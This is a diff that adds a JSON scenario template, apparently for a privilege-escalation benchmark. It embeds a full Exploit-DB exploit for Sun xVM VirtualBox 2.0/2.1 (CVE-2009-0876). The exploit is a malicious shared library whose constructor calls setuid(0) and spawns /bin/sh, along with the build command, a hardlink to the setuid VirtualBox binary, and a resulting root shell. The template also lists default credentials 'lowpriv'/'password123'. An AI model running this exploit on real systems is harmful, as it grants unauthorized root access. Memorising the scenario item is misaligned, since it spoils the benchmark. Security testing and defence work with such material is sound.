@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_32848",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: Sun xVM VirtualBox 2.0/2.1 - Local Privilege Escalation (CVE-2009-0876;OSVDB-52580)\n\nExploit source code (32848.txt):\n```\nsource: https://www.securityfocus.com/bid/34080/info\n\nSun xVM VirtualBox is prone to a local privilege-escalation vulnerability.\n\nAn attacker can exploit this vulnerability to run arbitrary code with superuser privileges.\n\nThe following versions for the Linux platform are vulnerable:\n\nSun xVM VirtualBox 2.0\nSun xVM VirtualBox 2.1\n\n$ id -u\n1002\n\n$ cat test.c\n#include <unistd.h>\n#include <sys/syscall.h>\n__attribute__((constructor))\nvoid awesome(void)\n{\n        char *argv[] = { \"sh\", NULL };\n        extern char *environ;\n        syscall(SYS_setuid, 0);\n        syscall(SYS_execve, \"/bin/sh\", argv, environ);\n}\n\n$ gcc -Wall test.c -fPIC -shared -o libdl.so.2 -Wl,-soname,libdl.so.2\n\n$ ls -l /opt/VirtualBox/VirtualBox\n-r-s--x--x 2 root vboxusers 23808 2009-01-30 01:57 /opt/VirtualBox/VirtualBox\n\n$ ln /opt/VirtualBox/VirtualBox\n\n$ ls -l VirtualBox\n-r-s--x--x 2 root vboxusers 23808 2009-01-30 01:57 VirtualBox\n\n$ ./VirtualBox\n./VirtualBox: /home/vapier/libdl.so.2: no version information available\n(required by ./VirtualBox)\nsh-4.0# whoami\nroot\n```",
+  "cve": "CVE-2009-0876;OSVDB-52580",
+  "exploitdb_id": "32848",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_32848",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
